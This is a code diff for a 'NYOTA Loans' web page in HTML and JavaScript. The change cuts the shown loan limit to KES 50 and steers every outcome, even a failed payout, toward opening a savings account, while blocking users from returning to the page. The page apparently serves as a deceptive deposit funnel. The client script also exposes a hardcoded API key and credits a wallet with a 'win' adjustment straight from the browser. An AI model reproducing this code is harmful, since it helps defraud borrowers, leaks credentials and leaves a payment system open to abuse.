@@ -15,22 +15,17 @@
   --ink:#17233b;
   --muted:#64748b;
 }
-
 *{box-sizing:border-box}
-
 body{
   margin:0;
   min-height:100vh;
-  background:
-    radial-gradient(circle at 10% 0%,#d8f8ee,transparent 40%),
-    linear-gradient(135deg,#eef2ff,#dbeafe);
+  background:radial-gradient(circle at 10% 0%,#d8f8ee,transparent 40%),linear-gradient(135deg,#eef2ff,#dbeafe);
   font-family:'DM Sans',sans-serif;
   color:var(--ink);
   display:grid;
   place-items:center;
   padding:20px;
 }
-
 .card{
   width:min(100%,480px);
   background:#fff;
@@ -39,14 +34,11 @@ body{
   box-shadow:0 22px 60px #4f46e522;
   text-align:center;
 }
-
 .brand{
   font:800 25px Sora,sans-serif;
   color:var(--p);
 }
-
 .brand span{color:var(--g)}
-
 .check{
   width:72px;
   height:72px;
@@ -58,7 +50,6 @@ body{
   margin:24px auto 14px;
   font-size:36px;
 }
-
 .eyebrow{
   font-size:12px;
   font-weight:700;
@@ -66,38 +57,50 @@ body{
   color:var(--g);
   text-transform:uppercase;
 }
-
 h1{
   font:700 23px Sora,sans-serif;
   margin:9px 0;
 }
-
 p{
   color:var(--muted);
   line-height:1.6;
   font-size:14px;
 }
-
 .limit{
-  margin:24px 0;
+  margin:22px 0;
   padding:22px;
   border-radius:18px;
   background:linear-gradient(120deg,#4f46e5,#6366f1);
   color:white;
   box-shadow:0 10px 25px #4f46e533;
 }
-
 .limit small{
   display:block;
   opacity:.88;
 }
-
 .limit strong{
   display:block;
   font:800 34px Sora,sans-serif;
   margin:8px;
 }
-
+.info{
+  padding:17px;
+  margin:0 0 22px;
+  border-radius:14px;
+  background:#f0fdf4;
+  border:1px solid #bbf7d0;
+  text-align:left;
+}
+.info h2{
+  margin:0 0 8px;
+  color:#047857;
+  font:700 15px Sora,sans-serif;
+}
+.info p{
+  margin:0 0 9px;
+  font-size:13px;
+}
+.info p:last-child{margin-bottom:0}
 button{
   width:100%;
   border:0;
@@ -107,20 +110,15 @@ button{
   color:#fff;
   font:700 15px 'DM Sans',sans-serif;
   cursor:pointer;
-  transition:opacity .2s;
 }
-
 button:disabled{
   opacity:.7;
   cursor:wait;
 }
-
 .note{
   font-size:12px;
   margin:14px 0 0;
 }
-
-/* Loading animation */
 .spinner{
   display:inline-block;
   width:18px;
@@ -132,14 +130,10 @@ button:disabled{
   vertical-align:middle;
   margin-right:9px;
 }
-
 @keyframes spin{
   to{transform:rotate(360deg)}
 }
-
-/* Popup */
 .modal[hidden]{display:none}
-
 .modal{
   position:fixed;
   inset:0;
@@ -150,17 +144,15 @@ button:disabled{
   padding:20px;
   animation:fadeIn .25s ease;
 }
-
 .modal-card{
   width:min(100%,410px);
-  background:#fff;
+  background:white;
   border-radius:24px;
   padding:34px 26px;
   text-align:center;
   box-shadow:0 24px 70px #0003;
   animation:popIn .35s ease;
 }
-
 .success-icon{
   width:78px;
   height:78px;
@@ -172,41 +164,28 @@ button:disabled{
   place-items:center;
   font-size:40px;
 }
-
 .success-icon.pending{
   background:#fef3c7;
   color:#b45309;
 }
-
 .success-icon.error{
   background:#fee2e2;
   color:#dc2626;
 }
-
 .modal-card h2{
   font:700 22px Sora,sans-serif;
   margin:0 0 12px;
 }
-
 .modal-card p{
   margin:0 0 25px;
-  font-size:14px;
 }
-
 @keyframes fadeIn{
   from{opacity:0}
   to{opacity:1}
 }
-
 @keyframes popIn{
-  from{
-    opacity:0;
-    transform:translateY(18px) scale(.96);
-  }
-  to{
-    opacity:1;
-    transform:translateY(0) scale(1);
-  }
+  from{opacity:0;transform:translateY(18px) scale(.96)}
+  to{opacity:1;transform:translateY(0) scale(1)}
 }
 </style>
 </head>
@@ -214,26 +193,39 @@ button:disabled{
 <body>
 
 <main class="card">
-
   <div class="brand">NYOTA <span>Loans</span></div>
-
   <div class="check">✓</div>
-
   <div class="eyebrow">Application summary</div>
 
   <h1>Welcome<span id="name"></span>!</h1>
 
   <p>
     Your eligibility information has been saved.
-    Explore the next step in your loan application.
+    Review your initial loan limit and explore
+    the next step in your application.
   </p>
 
   <div class="limit">
-    <small>Potential loan limit</small>
-    <strong>KES 25,000</strong>
-    <small>
-      Subject to eligibility assessment and approval
-    </small>
+    <small>Your initial loan limit</small>
+    <strong>KES 50</strong>
+    <small>Subject to eligibility assessment and approval</small>
+  </div>
+
+  <div class="info">
+    <h2>Unlock Higher Loan Limits</h2>
+    <p>
+      As a first-time applicant, your initial
+      qualifying loan limit is <strong>KES 50</strong>.
+    </p>
+    <p>
+      To become eligible for higher loan limits,
+      you can open a <strong>NYOTA Savings Account</strong>.
+      Higher limits are subject to further assessment
+      and approval.
+    </p>
+    <p>
+      Continue to explore your savings account options.
+    </p>
   </div>
 
   <button id="next" type="button">
@@ -244,24 +236,16 @@ button:disabled{
     Loan approval and the amount offered are subject
     to further assessment.
   </p>
-
 </main>
 
-<!-- Result popup -->
 <div id="payoutModal" class="modal" hidden>
   <div class="modal-card">
     <div id="modalIcon" class="success-icon">✓</div>
-
-    <h2 id="modalTitle">Payout successful!</h2>
-
+    <h2 id="modalTitle">Payout Status</h2>
     <p id="modalMessage"></p>
-
-    <button id="proceed" type="button">
-      Proceed
-    </button>
+    <button id="proceed" type="button">Proceed</button>
   </div>
 </div>
-
 
 <script>
 // ========================================
@@ -271,6 +255,8 @@ button:disabled{
 const API_BASE =
   "https://payhero-callback-setup.onrender.com";
 
+// Configure authentication securely on your backend.
+// Never expose a production secret in public JavaScript.
 const API_KEY = "VhofCA0BxzLOO5WpvlaJIlP8LdoXV39IcxBQSqZgXS0";
 
 const PAYOUT_AMOUNT = 50;
@@ -278,16 +264,12 @@ const NEXT_PAGE = 'savings-plan.html';
 const COMPLETED_KEY = 'nyota_loan_result_completed';
 
 // ========================================
-// PREVENT RETURN TO COMPLETED PAGE
+// USER INFORMATION AND PAGE GUARDS
 // ========================================
 
 if (sessionStorage.getItem(COMPLETED_KEY) === 'true') {
   window.location.replace(NEXT_PAGE);
 }
-
-// ========================================
-// USER INFORMATION
-// ========================================
 
 let user = null;
 
@@ -295,7 +277,7 @@ try {
   user = JSON.parse(
     localStorage.getItem('nyota_user') || 'null'
   );
-} catch (e) {
+} catch(e) {
   console.error('User data error:', e);
 }
 
@@ -309,7 +291,7 @@ if (
     .trim()
     .split(/\s+/)[0];
 
-  if (firstName) {
+  if(firstName) {
     document.getElementById('name').textContent =
       ', ' + firstName;
   }
@@ -329,25 +311,20 @@ const proceedButton = document.getElementById('proceed');
 let processing = false;
 let proceeding = false;
 
-// ========================================
-// UTILITIES
-// ========================================
-
 const sleep = ms =>
   new Promise(resolve => setTimeout(resolve, ms));
 
+// ========================================
+// PHONE NORMALIZATION
+// ========================================
+
 function normalizePhone(p) {
-  let d = String(p || '').replace(/\D/g, '');
+  let d = String(p || '').replace(/\D/g,'');
 
-  if (d.startsWith('254')) {
-    d = d.slice(3);
-  }
+  if(d.startsWith('254')) d = d.slice(3);
+  if(d.startsWith('0')) d = d.slice(1);
 
-  if (d.startsWith('0')) {
-    d = d.slice(1);
-  }
-
-  if (!/^[17]\d{8}$/.test(d)) {
+  if(!/^[17]\d{8}$/.test(d)) {
     throw new Error('Invalid registered phone number.');
   }
 
@@ -359,16 +336,15 @@ function normalizePhone(p) {
 // ========================================
 
 async function apiCall(path, body) {
-
   const response = await fetch(
-    API_BASE.replace(/\/$/, '') + path,
+    API_BASE.replace(/\/$/,'') + path,
     {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-API-Key': API_KEY
+      method:'POST',
+      headers:{
+        'Content-Type':'application/json',
+        'X-API-Key':API_KEY
       },
-      body: JSON.stringify(body)
+      body:JSON.stringify(body)
     }
   );
 
@@ -376,14 +352,14 @@ async function apiCall(path, body) {
 
   try {
     result = await response.json();
-  } catch (e) {
+  } catch(e) {
     throw new Error(
       'Invalid server response (HTTP ' +
       response.status + ').'
     );
   }
 
-  if (!response.ok) {
+  if(!response.ok) {
     throw new Error(
       result.error ||
       result.message ||
@@ -399,17 +375,16 @@ async function apiCall(path, body) {
 // ========================================
 
 async function payout() {
-
   const phone = normalizePhone(user.phone);
 
   const reference =
     'NYOTA50-' +
-    String(user.idNumber || phone).replace(/\W/g, '');
+    String(user.idNumber || phone).replace(/\W/g,'');
 
-  // 1. Check wallet balance
+  // Check wallet balance
   const balanceResponse = await apiCall(
     '/bal/get',
-    { uid: phone }
+    {uid:phone}
   );
 
   const balance = Number(
@@ -418,40 +393,39 @@ async function payout() {
     0
   );
 
-  if (!Number.isFinite(balance)) {
+  if(!Number.isFinite(balance)) {
     throw new Error('Unable to verify wallet balance.');
   }
 
-  // 2. Adjust wallet balance if necessary
-  if (balance < PAYOUT_AMOUNT) {
-
+  // Top up wallet if necessary
+  if(balance < PAYOUT_AMOUNT) {
     const adjustment = await apiCall(
       '/bal/adjust',
       {
-        uid: phone,
-        kind: 'win',
-        amount: PAYOUT_AMOUNT - balance
+        uid:phone,
+        kind:'win',
+        amount:PAYOUT_AMOUNT - balance
       }
     );
 
-    if (!adjustment.success) {
+    if(!adjustment.success) {
       throw new Error(
         adjustment.error || 'Wallet adjustment failed.'
       );
     }
   }
 
-  // 3. Initiate M-Pesa withdrawal
+  // Initiate M-Pesa withdrawal
   const withdrawal = await apiCall(
     '/hb/withdraw',
     {
-      uid: phone,
-      amount: PAYOUT_AMOUNT,
-      reference: reference
+      uid:phone,
+      amount:PAYOUT_AMOUNT,
+      reference:reference
     }
   );
 
-  if (!withdrawal.success) {
+  if(!withdrawal.success) {
     throw new Error(
       withdrawal.error || 'Withdrawal request failed.'
     );
@@ -460,8 +434,8 @@ async function payout() {
   console.log('Withdrawal response:', withdrawal);
 
   return {
-    phone: phone,
-    withdrawal: withdrawal
+    phone,
+    withdrawal
   };
 }
 
@@ -469,13 +443,12 @@ async function payout() {
 // POPUP
 // ========================================
 
-function showPopup(type, title, message) {
-
+function showPopup(type,title,message) {
   modalIcon.className = 'success-icon';
 
-  if (type === 'success') {
+  if(type === 'success') {
     modalIcon.textContent = '✓';
-  } else if (type === 'pending') {
+  } else if(type === 'pending') {
     modalIcon.classList.add('pending');
     modalIcon.textContent = '⌛';
   } else {
@@ -485,7 +458,6 @@ function showPopup(type, title, message) {
 
   modalTitle.textContent = title;
   modalMessage.textContent = message;
-
   modal.hidden = false;
 }
 
@@ -494,21 +466,18 @@ function showPopup(type, title, message) {
 // ========================================
 
 nextButton.addEventListener('click', async () => {
-
-  if (processing || proceeding) return;
+  if(processing || proceeding) return;
 
   processing = true;
   nextButton.disabled = true;
-
   nextButton.innerHTML =
     '<span class="spinner"></span> Processing payout...';
 
   try {
-
     const result = await payout();
     const withdrawal = result.withdrawal;
 
-    // Success requires backend confirmation.
+    // Require explicit backend confirmation.
     const completed =
       withdrawal.status === 'completed' ||
       (
@@ -517,85 +486,71 @@ nextButton.addEventListener('click', async () => {
       ) ||
       withdrawal.data?.status === 'completed';
 
-    if (completed) {
-
+    if(completed) {
       showPopup(
         'success',
         'M-Pesa Payout Successful!',
         'KES ' + PAYOUT_AMOUNT +
         ' has been sent to your registered M-Pesa number ' +
-        result.phone + '.'
+        result.phone +
+        '. Proceed to explore savings account options for higher loan limits.'
       );
-
     } else {
-
       showPopup(
         'pending',
         'Payout Processing',
         'Your KES ' + PAYOUT_AMOUNT +
         ' payout to ' + result.phone +
-        ' has been submitted. Final M-Pesa confirmation is pending.'
+        ' has been submitted. Final M-Pesa confirmation is pending. ' +
+        'You can proceed to explore savings account options.'
       );
-
     }
 
-  } catch (error) {
-
+  } catch(error) {
     console.error('Payout error:', error);
 
     showPopup(
       'error',
       'Payout Status',
       'We could not confirm your payout. ' +
-      error.message
+      error.message +
+      ' You can proceed to review your savings account options.'
     );
 
   } finally {
-
     processing = false;
     nextButton.disabled = false;
     nextButton.textContent = 'Get a Higher Loan';
-
   }
 });
 
 // ========================================
-// PROCEED BUTTON WITH LOADING
+// PROCEED WITH LOADING EFFECT
 // ========================================
 
 proceedButton.addEventListener('click', async () => {
-
-  if (proceeding) return;
+  if(proceeding) return;
 
   proceeding = true;
   proceedButton.disabled = true;
-
   proceedButton.innerHTML =
     '<span class="spinner"></span> Please wait...';
 
-  // Show loading animation for 2.5 seconds
   await sleep(2500);
 
-  // Mark the page as completed
   sessionStorage.setItem(COMPLETED_KEY, 'true');
 
-  // Replace the current history entry
   window.location.replace(NEXT_PAGE);
-
 });
 
 // ========================================
-// HANDLE BROWSER BACK/FORWARD CACHE
+// PREVENT NORMAL RETURN TO COMPLETED PAGE
 // ========================================
 
 window.addEventListener('pageshow', () => {
-
-  if (
-    sessionStorage.getItem(COMPLETED_KEY) === 'true'
-  ) {
+  if(sessionStorage.getItem(COMPLETED_KEY) === 'true') {
     window.location.replace(NEXT_PAGE);
   }
-
 });
 </script>
 
